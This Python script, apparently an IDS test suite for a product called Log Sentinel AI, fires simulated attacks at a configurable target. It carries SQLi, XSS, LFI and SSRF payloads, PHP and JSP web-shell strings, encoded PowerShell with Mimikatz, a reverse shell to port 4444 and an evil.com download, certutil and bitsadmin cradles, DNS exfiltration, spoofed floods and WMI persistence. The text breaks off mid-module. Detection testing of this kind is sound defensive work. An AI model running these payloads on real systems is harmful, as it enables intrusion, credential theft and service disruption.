#!/usr/bin/env python3
"""
log_sentinel_ids_tester.py — IDS/IPS Testing Suite for Log Sentinel AI
======================================================================

Comprehensive attack simulation tool for Log Sentinel AI.

HOW LOG SENTINEL AI DETECTS THREATS
─────────────────────────────────────
Log Sentinel AI reads Windows Event Logs (Security, System, Application).
It does NOT inspect raw network traffic or packets.

What this means for testing:
  • modules recon / bruteforce / web / evasion / exfil / dos
    → send TCP/UDP/HTTP traffic that Windows never logs
    → these modules verify the network activity occurs, but Log Sentinel
       will NOT see them on the dashboard
  • module windows_events   ← START HERE
    → directly injects Application-log entries whose text matches the
       threat keyword patterns the log collector scans for
    → ALSO triggers real Security log events (failed logons → 4625,
       scheduled tasks → 4698, user creation → 4720)
    → this is the module that produces dashboard alerts for every category
  • modules payloads / host
    → run PowerShell / cmd commands that DO generate Windows Event Log
       entries → produce suspicious_process / privilege_esc / log_tamper

RECOMMENDED USAGE
─────────────────
  # Quick detection test (all threat categories on dashboard):
  python log_sentinel_ids_tester.py --module windows_events

  # Full test suite (network + host + log injection):
  python log_sentinel_ids_tester.py --all

  # Specific module:
  python log_sentinel_ids_tester.py --module host

Usage:
    python log_sentinel_ids_tester.py --all
    python log_sentinel_ids_tester.py --module windows_events
    python log_sentinel_ids_tester.py --module web
    python log_sentinel_ids_tester.py --list
    python log_sentinel_ids_tester.py --continuous

Requirements:
    pip install scapy requests psutil colorama
    Run as Administrator for full coverage (Security log events require it)
"""

import argparse
import base64
import hashlib
import html
import json
import os
import platform
import random
import socket
import string
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import urllib.parse
import uuid
from datetime import datetime
from pathlib import Path

# Force UTF-8 output on Windows (avoids UnicodeEncodeError for box-drawing chars)
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# ── Conditional imports ──────────────────────────────────────────────────
try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Raw, Ether, send, sr1, fragment,
        RandShort, RandIP, DNS, DNSQR
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False


# ── Admin helpers ────────────────────────────────────────────────────────

def _is_admin() -> bool:
    try:
        if platform.system().lower() == "windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


def _relaunch_as_admin() -> None:
    """Re-launch this script with UAC elevation and exit the current process."""
    import ctypes
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    if ret <= 32:
        print(f"\n  {Color.R}✗{Color.U}  UAC elevation failed (code {ret}).")
        print(f"         Right-click the terminal → Run as Administrator, then retry.")
    sys.exit(0)


# ── Terminal colors ──────────────────────────────────────────────────────
class Color:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    C = "\033[96m"; M = "\033[95m"; DIM = "\033[2m"
    B = "\033[1m";  U = "\033[0m"

BANNER = f"""
{Color.C}╔══════════════════════════════════════════════════════════════╗
║     LOG SENTINEL AI — IDS/IPS TESTING SUITE v1.0           ║
║     Test your AI-based detection across multiple vectors   ║
╚══════════════════════════════════════════════════════════════╝{Color.U}
"""

def ok(msg):    print(f"  {Color.G}✓{Color.U}  {msg}")
def warn(msg):  print(f"  {Color.Y}⚠{Color.U}  {msg}")
def err(msg):   print(f"  {Color.R}✗{Color.U}  {msg}")
def info(msg):  print(f"  {Color.C}→{Color.U}  {msg}")
def section(n): print(f"\n{Color.C}─── [{n}] ───{Color.U}\n")
def highlight(msg): print(f"  {Color.B}{Color.M}{msg}{Color.U}")


class IDSTester:
    """Comprehensive IDS testing framework for Log Sentinel AI."""

    def __init__(self, target_ip="127.0.0.1", target_ports=None,
                 report_dir="ids_test_reports", verbose=False,
                 delay_between=2):
        self.target_ip = target_ip
        self.target_ports = target_ports or [80, 443, 22, 3389, 8080, 21, 3306, 445, 135, 1433]
        self.report_dir = Path(report_dir)
        self.report_dir.mkdir(exist_ok=True)
        self.verbose = verbose
        self.delay = delay_between
        self.results = {}
        self._counter = 0

    def _next_id(self):
        self._counter += 1
        return f"T{self._counter:04d}"

    def _record(self, module, test_name, status, detail, severity="MEDIUM"):
        if module not in self.results:
            self.results[module] = []
        entry = {
            "id": self._next_id(),
            "test": test_name,
            "status": status,
            "severity": severity,
            "detail": detail,
            "timestamp": datetime.now().isoformat()
        }
        self.results[module].append(entry)
        return entry

    def _run_cmd(self, cmd, timeout=10):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode == 0, r.stdout.strip()
        except Exception as e:
            return False, str(e)

    # ══════════════════════════════════════════════════════════════════
    # MODULE 1 — Network Reconnaissance
    # ══════════════════════════════════════════════════════════════════

    def module_recon(self):
        """Simulate attacker reconnaissance — port scans, OS fingerprinting."""
        section("NETWORK RECONNAISSANCE")

        # 1a — TCP Connect scan
        info("TCP Connect port scan...")
        open_ports = []
        for port in self.target_ports[:8]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((self.target_ip, port)) == 0:
                    open_ports.append(port)
                s.close()
            except Exception:
                pass

        st = "COMPLETED" if open_ports else "NO_OPEN_PORTS"
        self._record("recon", "TCP Port Scan", st,
                     f"Scanned {len(self.target_ports)} ports, {len(open_ports)} open: {open_ports}",
                     "MEDIUM")
        ok(f"Port scan complete — {len(open_ports)} open ports detected" if open_ports else "No open ports")

        # 1b — SYN scan (Scapy-based)
        if HAS_SCAPY:
            time.sleep(self.delay)
            info("SYN stealth scan (scapy)...")
            syn_found = 0
            for port in random.sample(self.target_ports, min(5, len(self.target_ports))):
                try:
                    pkt = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
                    ans = sr1(pkt, timeout=1, verbose=0)
                    if ans and ans.haslayer(TCP) and ans[TCP].flags & 0x12:
                        syn_found += 1
                except Exception:
                    pass
            self._record("recon", "SYN Stealth Scan", "COMPLETED",
                         f"SYN scan on 5 ports, {syn_found} responded", "HIGH")
            ok(f"SYN scan done — {syn_found} responsive ports")

        # 1c — OS fingerprinting via TTL/Window size
        time.sleep(self.delay)
        info("Passive OS fingerprinting...")
        os_signatures = []
        for port in [80, 22, 443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, port))
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                os_signatures.append(f"Port {port}: reachable")
                s.close()
            except Exception:
                pass

        self._record("recon", "OS Fingerprinting", "COMPLETED",
                     f"Attempted fingerprint via {len(os_signatures)} services: {os_signatures}",
                     "LOW")
        ok(f"OS fingerprinting — {len(os_signatures)} services probed")

        # 1d — DNS enumeration
        if HAS_SCAPY:
            time.sleep(self.delay)
            info("DNS reconnaissance...")
            try:
                dns_req = IP(dst=self.target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
                reply = sr1(dns_req, timeout=1, verbose=0)
                dns_status = "Responded" if reply else "No response"
            except Exception:
                dns_status = "Failed"
            self._record("recon", "DNS Query", "COMPLETED", dns_status, "LOW")
            ok(f"DNS recon: {dns_status}")

        highlight("  ✓ Recon module complete — IDS should flag: RECON / MEDIUM-HIGH")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 2 — Brute Force & Credential Attacks
    # ══════════════════════════════════════════════════════════════════

    def module_bruteforce(self):
        """Simulate brute force attacks against various services."""
        section("BRUTE FORCE & CREDENTIAL ATTACKS")

        # 2a — SSH brute force (if port 22 open)
        time.sleep(self.delay)
        info("SSH brute force simulation...")
        if 22 in self.target_ports or not HAS_SCAPY:
            ssh_attempts = 0
            for _ in range(8):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((self.target_ip, 22))
                    s.send(b"SSH-2.0-OpenSSH_8.9p1\r\n")
                    time.sleep(0.1)
                    s.close()
                    ssh_attempts += 1
                except Exception:
                    pass
            self._record("bruteforce", "SSH Brute Force", "COMPLETED",
                         f"8 rapid SSH connection attempts to port 22", "HIGH")
            ok(f"SSH brute force: {ssh_attempts}/8 attempts sent")

        # 2b — RDP brute force (port 3389)
        time.sleep(self.delay)
        info("RDP brute force simulation...")
        rdp_attempts = 0
        for _ in range(6):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((self.target_ip, 3389))
                s.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00"
                       b"\x08\x00\x03\x00\x00\x00")
                s.close()
                rdp_attempts += 1
            except Exception:
                pass
        self._record("bruteforce", "RDP Brute Force", "COMPLETED",
                     f"6 RDP connection attempts to port 3389", "CRITICAL")
        ok(f"RDP brute force: {rdp_attempts}/6 attempts sent")

        # 2c — HTTP form login brute force
        if HAS_REQUESTS:
            time.sleep(self.delay)
            info("HTTP login brute force...")
            common_passwords = ["admin", "password", "12345", "admin123", "root",
                                "test", "guest", "letmein", "welcome", "passw0rd"]
            http_attempts = 0
            for pw in common_passwords[:5]:
                try:
                    data = {"username": "admin", "password": pw}
                    requests.post(f"http://{self.target_ip}:{self.target_ports[0]}/login",
                                      data=data, timeout=2)
                    http_attempts += 1
                except Exception:
                    pass
            self._record("bruteforce", "HTTP Login Brute Force", "COMPLETED",
                         f"{http_attempts} HTTP POST login attempts to /login", "HIGH")
            ok(f"HTTP login attempts: {http_attempts}")

        # 2d — SMB brute force (port 445)
        time.sleep(self.delay)
        info("SMB brute force simulation...")
        smb_attempts = 0
        for _ in range(5):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((self.target_ip, 445))
                s.send(b"\x00\x00\x00\x45\xfe\x53\x4d\x42\x72\x00\x00\x00\x00"
                       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                s.close()
                smb_attempts += 1
            except Exception:
                pass
        self._record("bruteforce", "SMB Brute Force", "COMPLETED",
                     f"{smb_attempts} SMB session attempts to port 445", "HIGH")
        ok(f"SMB attempts: {smb_attempts}")

        highlight("  ✓ Brute force module complete — IDS should flag: BRUTE_FORCE / CRITICAL")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 3 — Web Application Attacks
    # ══════════════════════════════════════════════════════════════════

    def module_web(self):
        """Simulate web application attacks — SQLi, XSS, LFI, SSRF, etc."""
        section("WEB APPLICATION ATTACKS")
        if not HAS_REQUESTS:
            warn("Requests library not installed — skipping web module")
            return

        web_port = self.target_ports[0] if self.target_ports else 80
        base = f"http://{self.target_ip}:{web_port}"

        # 3a — SQL Injection probes
        time.sleep(self.delay)
        info("SQL Injection probes...")
        sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT @@version,user()--",
            "' WAITFOR DELAY '0:0:5'--",
        ]
        sqli_count = 0
        for payload in sqli_payloads:
            try:
                requests.get(f"{base}/search?q={urllib.parse.quote(payload)}", timeout=2)
                sqli_count += 1
                requests.post(f"{base}/login", data={"user": payload, "pass": "test"}, timeout=2)
                sqli_count += 1
            except Exception:
                pass
        self._record("web", "SQL Injection", "COMPLETED",
                     f"{sqli_count} SQLi probe requests sent with {len(sqli_payloads)} payload variants",
                     "CRITICAL")
        ok(f"SQL injection: {sqli_count} requests")

        # 3b — Cross-Site Scripting (XSS)
        time.sleep(self.delay)
        info("XSS attack vectors...")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert('XSS')",
            "\" onmouseover=\"alert(1)\"",
            "';alert(1);//",
            "<iframe src=javascript:alert(1)>",
        ]
        xss_count = 0
        for payload in xss_payloads:
            try:
                requests.get(f"{base}/search?q={urllib.parse.quote(payload)}", timeout=2)
                xss_count += 1
            except Exception:
                pass
        self._record("web", "Cross-Site Scripting", "COMPLETED",
                     f"{xss_count} XSS payloads injected via URL parameters", "HIGH")
        ok(f"XSS: {xss_count} payloads sent")

        # 3c — Local File Inclusion (LFI)
        time.sleep(self.delay)
        info("Local File Inclusion probes...")
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../etc/shadow",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "../../../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
        ]
        lfi_count = 0
        for payload in lfi_payloads:
            try:
                requests.get(f"{base}/file?path={urllib.parse.quote(payload)}", timeout=2)
                lfi_count += 1
            except Exception:
                pass
        self._record("web", "Local File Inclusion", "COMPLETED",
                     f"{lfi_count} LFI path traversal attempts", "CRITICAL")
        ok(f"LFI: {lfi_count} traversal attempts")

        # 3d — SSRF probes
        time.sleep(self.delay)
        info("Server-Side Request Forgery...")
        ssrf_targets = [
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:3306",
            "file:///etc/passwd",
            "http://0.0.0.0:80",
            "gopher://localhost:6379/_FLUSHALL",
        ]
        ssrf_count = 0
        for target in ssrf_targets:
            try:
                requests.get(f"{base}/proxy?url={urllib.parse.quote(target)}", timeout=2)
                ssrf_count += 1
            except Exception:
                pass
        self._record("web", "Server-Side Request Forgery", "COMPLETED",
                     f"{ssrf_count} SSRF probes to internal services", "CRITICAL")
        ok(f"SSRF: {ssrf_count} internal service probes")

        # 3e — Command Injection
        time.sleep(self.delay)
        info("Command injection attempts...")
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(cat /etc/passwd)",
            "& ping -n 4 127.0.0.1 &",
            "|| dir",
        ]
        cmd_count = 0
        for payload in cmd_payloads:
            try:
                requests.get(f"{base}/ping?host={urllib.parse.quote(payload)}", timeout=2)
                cmd_count += 1
            except Exception:
                pass
        self._record("web", "Command Injection", "COMPLETED",
                     f"{cmd_count} command injection payloads", "CRITICAL")
        ok(f"Command injection: {cmd_count} payloads")

        # 3f — Path traversal & directory listing
        time.sleep(self.delay)
        info("Directory traversal & listing...")
        traversal_paths = [
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/../../../../etc/passwd",
            "/../../../boot.ini",
            "/WEB-INF/web.xml",
            "/.git/config",
            "/admin/",
            "/wp-admin/",
            "/backup/",
        ]
        trav_count = 0
        for path in traversal_paths:
            try:
                requests.get(f"{base}{path}", timeout=2)
                trav_count += 1
            except Exception:
                pass
        self._record("web", "Path Traversal", "COMPLETED",
                     f"{trav_count} directory traversal & config file requests", "HIGH")
        ok(f"Path traversal: {trav_count} paths probed")

        # 3g — Mass assignment / parameter pollution
        time.sleep(self.delay)
        info("Parameter pollution & mass assignment...")
        try:
            requests.post(f"{base}/api/user/update",
                              json={"id": 1, "role": "admin", "is_admin": True},
                              timeout=2)
            self._record("web", "Mass Assignment", "COMPLETED",
                         f"POST with elevated privileges in request body", "HIGH")
            ok("Mass assignment probe sent")
        except Exception:
            ok("Mass assignment probe (target may not exist)")

        # 3h — File upload abuse
        time.sleep(self.delay)
        info("Malicious file upload simulation...")
        malicious_files = [
            ("shell.php", "<?php system($_GET['cmd']); ?>"),
            ("exploit.aspx", "<%@ Page Language=\"C#\" %>"),
            ("payload.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
            ("config.php", "<?php // backdoor entry ?>"),
        ]
        upload_count = 0
        for fname, content in malicious_files:
            try:
                requests.post(f"{base}/upload",
                                  files={"file": (fname, content, "application/x-php")},
                                  timeout=2)
                upload_count += 1
            except Exception:
                pass
        self._record("web", "Malicious File Upload", "COMPLETED",
                     f"{upload_count} web shell upload attempts: .php, .aspx, .jsp", "CRITICAL")
        ok(f"Malicious uploads: {upload_count}")

        # 3i — IDOR (Insecure Direct Object Reference)
        time.sleep(self.delay)
        info("IDOR probes...")
        idor_count = 0
        for obj_id in [1001, 1002, 1003, 1004, 1005]:
            try:
                requests.get(f"{base}/api/user/{obj_id}/details", timeout=2)
                idor_count += 1
            except Exception:
                pass
        self._record("web", "IDOR", "COMPLETED",
                     f"{idor_count} sequential object ID enumeration attempts", "HIGH")
        ok(f"IDOR: {idor_count} sequential IDs probed")

        highlight("  ✓ Web module complete — IDS should flag: WEB_ATTACK / HIGH-CRITICAL")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 4 — Payload Delivery & Malware Simulation
    # ══════════════════════════════════════════════════════════════════

    def module_payloads(self):
        """Simulate malware delivery, obfuscated payloads, and download cradles."""
        section("PAYLOAD DELIVERY & MALWARE SIMULATION")

        # 4a — Encoded PowerShell commands
        time.sleep(self.delay)
        info("Encoded PowerShell execution (fileless malware pattern)...")
        ps_payloads = [
            base64.b64encode("Invoke-Mimikatz -DumpCreds".encode("utf-16-le")).decode(),
            base64.b64encode("Start-Process -WindowStyle Hidden cmd.exe".encode("utf-16-le")).decode(),
            base64.b64encode("iex (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')".encode("utf-16-le")).decode(),
            base64.b64encode("$c=New-Object System.Net.Sockets.TCPClient;$c.Connect('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};".encode("utf-16-le")).decode(),
        ]
        ps_count = 0
        for payload in ps_payloads:
            try:
                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
                       "-NoProfile", "-EncodedCommand", payload]
                subprocess.run(cmd, capture_output=True, timeout=5)
                ps_count += 1
            except Exception:
                pass
        self._record("payloads", "Encoded PowerShell", "COMPLETED",
                     f"{ps_count} base64-encoded PowerShell commands executed (harmless wrappers)", "CRITICAL")
        ok(f"Encoded PowerShell: {ps_count} payloads executed")

        # 4b — Download cradle patterns
        time.sleep(self.delay)
        info("Download cradle patterns (LOLBins)...")
        cradles = [
            ["powershell", "-Command", "(New-Object Net.WebClient).DownloadString('http://127.0.0.1/evil') | Out-Null"],
            ["powershell", "-Command", "Invoke-WebRequest -Uri http://127.0.0.1/ps1 -OutFile $env:TEMP\\d.exe"],
            ["powershell", "-Command", "Start-BitsTransfer -Source http://127.0.0.1/ps1 -Destination $env:TEMP\\d.exe"],
            ["certutil", "-urlcache", "-f", "http://127.0.0.1/evil.exe", "%TEMP%\\e.exe"],
            ["bitsadmin", "/transfer", "job", "http://127.0.0.1/evil.exe", "%TEMP%\\f.exe"],
        ]
        cradle_count = 0
        for cmd in cradles:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
                cradle_count += 1
            except Exception:
                pass
        self._record("payloads", "Download Cradles", "COMPLETED",
                     f"{cradle_count} LOLBin download cradles executed (PowerShell, certutil, bitsadmin)", "HIGH")
        ok(f"Download cradles: {cradle_count} executed")

        # 4c — Suspicious process creation chain
        time.sleep(self.delay)
        info("Suspicious process chain...")
        chain = [
            ["cmd.exe", "/c", "echo %USERNAME% && whoami"],
            ["powershell", "-Command", "Get-Process -Name lsass, svchost, winlogon"],
            ["cmd.exe", "/c", "net localgroup administrators"],
            ["powershell", "-Command", "Get-WmiObject Win32_UserAccount"],
            ["reg", "query", "HKLM\\SYSTEM\\CurrentControlSet\\Services"],
        ]
        chain_count = 0
        for cmd in chain:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
                chain_count += 1
            except Exception:
                pass
        self._record("payloads", "Suspicious Process Chain", "COMPLETED",
                     f"{chain_count} reconnaissance commands in quick succession", "MEDIUM")
        ok(f"Process chain: {chain_count} recon commands")

        # 4d — WMI persistence
        time.sleep(self.delay)
        info("WMI persistence simulation...")
        try:
            subprocess.run(
                ["powershell", "-Command",
                 "Register-WmiEvent -Query 'SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=''cmd.exe''' "
                 "-Action { Start-Process notepad }"],
                capture_output=True, timeout=5
            )
            ok("WMI event subscription created (persistence)")
            self._record("payloads", "WMI Persistence", "COMPLETED",
                         "WMI event subscription registered for process start trigger", "HIGH")
        except Exception:
            ok("WMI persistence probe (may need admin)")

        # 4e — Encoded/encrypted payload in environment variable
        time.sleep(self.delay)
        info("Obfuscated payload in environment variables...")
        try:
            obfuscated = base64.b64encode(b"Invoke-Expression (Get-ChildItem Env:OSType).Value").decode()
            os.environ["OSType"] = base64.b64encode(b"Start-Process calc.exe").decode()
            subprocess.run(["powershell", "-Command", obfuscated],
                           capture_output=True, timeout=5)
            self._record("payloads", "Env Obfuscation", "COMPLETED",
                         "Payload hidden in environment variable, decoded at runtime", "HIGH")
            ok("Environment variable obfuscation tested")
        except Exception:
            ok("Env obfuscation probe")

        highlight("  ✓ Payload module complete — IDS should flag: PAYLOAD_DELIVERY / CRITICAL")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 5 — Evasion Techniques
    # ══════════════════════════════════════════════════════════════════

    def module_evasion(self):
        """Test IDS evasion techniques — fragmentation, encoding, timing."""
        section("EVASION TECHNIQUES")

        if not HAS_SCAPY:
            warn("Scapy not installed — evasion module requires it")
            return

        # 5a — Packet fragmentation
        time.sleep(self.delay)
        info("Packet fragmentation (IP fragments)...")
        frag_count = 0
        try:
            payload = b"GET /etc/passwd HTTP/1.1\r\nHost: evil.com\r\n\r\n"
            big_pkt = IP(dst=self.target_ip)/TCP(dport=80, flags="PA")/Raw(load=payload)
            frags = fragment(big_pkt, fragsize=32)
            for f in frags:
                send(f, verbose=0)
                time.sleep(0.05)
                frag_count += 1
            ok(f"IP fragmentation: {frag_count} fragments sent")
            self._record("evasion", "IP Fragmentation", "COMPLETED",
                         f"{frag_count} fragments (32-byte) to evade signature matching", "HIGH")
        except Exception as e:
            warn(f"Fragmentation failed: {e}")

        # 5b — Base64 + hex encoding in HTTP requests
        time.sleep(self.delay)
        info("Encoded HTTP requests...")
        if HAS_REQUESTS:
            encoded_count = 0
            encodings = [
                ("base64", base64.b64encode(b"../../../etc/passwd").decode()),
                ("hex", "../../../etc/passwd".encode().hex()),
                ("double_url", urllib.parse.quote(urllib.parse.quote("../../../etc/passwd"))),
            ]
            for _, enc_val in encodings:
                try:
                    requests.get(f"http://{self.target_ip}:{self.target_ports[0]}/file?path={enc_val}",
                                     timeout=2)
                    encoded_count += 1
                except Exception:
                    pass
            self._record("evasion", "Encoded Requests", "COMPLETED",
                         f"{encoded_count} encoded/obfuscated request variants", "MEDIUM")
            ok(f"Encoded requests: {encoded_count}")

        # 5c — Slowloris-style timing attack
        time.sleep(self.delay)
        info("Slow HTTP attack simulation...")
        slow_count = 0
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                time.sleep(1.5)
                s.send(b"X-Keep-Alive: yes\r\n")
                time.sleep(1.5)
                s.send(b"Slow-Header: " + b"A" * 1000 + b"\r\n\r\n")
                s.close()
                slow_count += 1
            except Exception:
                pass
        self._record("evasion", "Slow HTTP Attack", "COMPLETED",
                     f"{slow_count} slow-header connections (slowloris pattern)", "MEDIUM")
        ok(f"Slow HTTP: {slow_count} connections")

        # 5d — Protocol anomaly / non-standard flags
        time.sleep(self.delay)
        info("TCP flag anomalies...")
        anomaly_count = 0
        flag_combos = [
            {"flags": 0x00},     # NULL scan
            {"flags": 0x01},     # FIN scan
            {"flags": 0x29},     # FIN+PSH+URG
            {"flags": 0x2B},     # SYN+FIN
            {"flags": 0x0B},     # URG+FIN
        ]
        for fc in flag_combos:
            try:
                pkt = IP(dst=self.target_ip)/TCP(dport=self.target_ports[0],
                                                  flags=fc["flags"])
                send(pkt, verbose=0)
                anomaly_count += 1
            except Exception:
                pass
        self._record("evasion", "TCP Flag Anomalies", "COMPLETED",
                     f"{anomaly_count} abnormal TCP flag combinations sent", "MEDIUM")
        ok(f"TCP anomalies: {anomaly_count} flag combos")

        # 5e — Random source ports & IPs (spoofing)
        time.sleep(self.delay)
        info("Source IP/port randomization...")
        rand_count = 0
        for _ in range(5):
            try:
                pkt = IP(src=RandIP(), dst=self.target_ip)/TCP(sport=RandShort(),
                          dport=80, flags="S")
                send(pkt, verbose=0)
                rand_count += 1
            except Exception:
                pass
        self._record("evasion", "Source Spoofing", "COMPLETED",
                     f"{rand_count} packets with randomized source IPs and ports", "HIGH")
        ok(f"Spoofed packets: {rand_count}")

        highlight("  ✓ Evasion module complete — IDS should flag: EVASION / HIGH")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 6 — Data Exfiltration
    # ══════════════════════════════════════════════════════════════════

    def module_exfil(self):
        """Simulate data exfiltration via DNS, HTTP, ICMP tunnels."""
        section("DATA EXFILTRATION")

        # 6a — DNS exfiltration simulation
        time.sleep(self.delay)
        info("DNS exfiltration (data encoded in subdomains)...")
        if HAS_SCAPY:
            exfil_count = 0
            data_chunks = [
                base64.b64encode(b"admin:Password123!").decode().replace("=", ""),
                base64.b64encode(b"credit_card:4111-1111-1111-1111").decode().replace("=", ""),
                base64.b64encode(b"secret_key:sk-abc123def456").decode().replace("=", ""),
            ]
            for chunk in data_chunks:
                try:
                    domain = f"{chunk}.exfil.evil.com"
                    pkt = IP(dst=self.target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                    send(pkt, verbose=0)
                    exfil_count += 1
                except Exception:
                    pass
            self._record("exfil", "DNS Exfiltration", "COMPLETED",
                         f"{exfil_count} DNS queries with base64-encoded data in subdomains", "CRITICAL")
            ok(f"DNS exfil: {exfil_count} encoded queries")
        else:
            ok("DNS exfil skipped (scapy required)")

        # 6b — HTTP data exfiltration
        time.sleep(self.delay)
        info("HTTP data exfiltration...")
        if HAS_REQUESTS:
            exfil_count = 0
            exfil_data = [
                {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"},
                {"X-Data": base64.b64encode(b"sensitive_doc_2025_v2.pdf").decode()},
                {"Cookie": f"session={uuid.uuid4().hex}; userdata={base64.b64encode(b'admin:true').decode()}"},
            ]
            for headers in exfil_data:
                try:
                    requests.get(f"http://{self.target_ip}:{self.target_ports[0]}/api/data",
                                     headers=headers, timeout=2)
                    exfil_count += 1
                except Exception:
                    pass
            self._record("exfil", "HTTP Exfiltration", "COMPLETED",
                         f"{exfil_count} HTTP requests with exfiltrated data in headers", "HIGH")
            ok(f"HTTP exfil: {exfil_count} header-based exfiltration")

        # 6c — ICMP tunnel
        time.sleep(self.delay)
        info("ICMP data tunneling...")
        if HAS_SCAPY:
            icmp_count = 0
            for _ in range(3):
                try:
                    payload = b"EXFIL:" + base64.b64encode(b"user_data_export_2025")
                    pkt = IP(dst=self.target_ip)/ICMP(type=8, code=0)/Raw(load=payload)
                    send(pkt, verbose=0)
                    icmp_count += 1
                except Exception:
                    pass
            self._record("exfil", "ICMP Tunnel", "COMPLETED",
                         f"{icmp_count} ICMP echo requests with hidden payload in data field", "HIGH")
            ok(f"ICMP tunnel: {icmp_count} covert packets")

        # 6d — Large outbound data transfer
        time.sleep(self.delay)
        info("Large data transfer (potential exfil)...")
        try:
            big_data = b"A" * 1000000  # 1MB
            if HAS_REQUESTS:
                for _ in range(2):
                    requests.post(f"http://{self.target_ip}:{self.target_ports[0]}/api/upload",
                                  data=big_data, timeout=5)
                self._record("exfil", "Large Data Transfer", "COMPLETED",
                             "2MB of data transferred in POST requests (volume anomaly)", "MEDIUM")
                ok("Large data transfer: 2MB sent")
        except Exception:
            ok("Large data transfer attempted")

        highlight("  ✓ Exfiltration module complete — IDS should flag: DATA_EXFIL / CRITICAL")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 7 — Denial of Service
    # ══════════════════════════════════════════════════════════════════

    def module_dos(self):
        """Non-destructive DoS simulation — limited scale."""
        section("DENIAL OF SERVICE (NON-DESTRUCTIVE)")

        if not HAS_SCAPY:
            warn("Scapy required for DoS module")
            return

        # 7a — SYN flood (limited: 20 packets only)
        time.sleep(self.delay)
        info("SYN flood (limited: 20 packets)...")
        syn_count = 0
        for _ in range(20):
            try:
                pkt = IP(dst=self.target_ip, src=RandIP())/TCP(sport=RandShort(),
                          dport=80, flags="S")
                send(pkt, verbose=0)
                syn_count += 1
            except Exception:
                pass
        self._record("dos", "SYN Flood", "COMPLETED",
                     f"{syn_count} SYN packets from random source IPs (limited test)", "HIGH")
        ok(f"SYN flood: {syn_count} packets")

        # 7b — ICMP flood (limited)
        time.sleep(self.delay)
        info("ICMP echo flood (limited: 10 packets)...")
        icmp_count = 0
        for _ in range(10):
            try:
                pkt = IP(dst=self.target_ip)/ICMP(type=8, code=0)
                send(pkt, verbose=0)
                icmp_count += 1
            except Exception:
                pass
        self._record("dos", "ICMP Flood", "COMPLETED",
                     f"{icmp_count} ICMP echo requests", "MEDIUM")
        ok(f"ICMP flood: {icmp_count} packets")

        # 7c — Slow read attack
        time.sleep(self.delay)
        info("Slow read attack simulation...")
        slow_count = 0
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                s.settimeout(0.1)
                while True:
                    try:
                        chunk = s.recv(1)
                        if not chunk:
                            break
                    except socket.timeout:
                        break
                s.close()
                slow_count += 1
            except Exception:
                pass
        self._record("dos", "Slow Read Attack", "COMPLETED",
                     f"{slow_count} slow-read connections consuming server resources", "MEDIUM")
        ok(f"Slow read: {slow_count} connections")

        # 7d — Connection exhaustion
        time.sleep(self.delay)
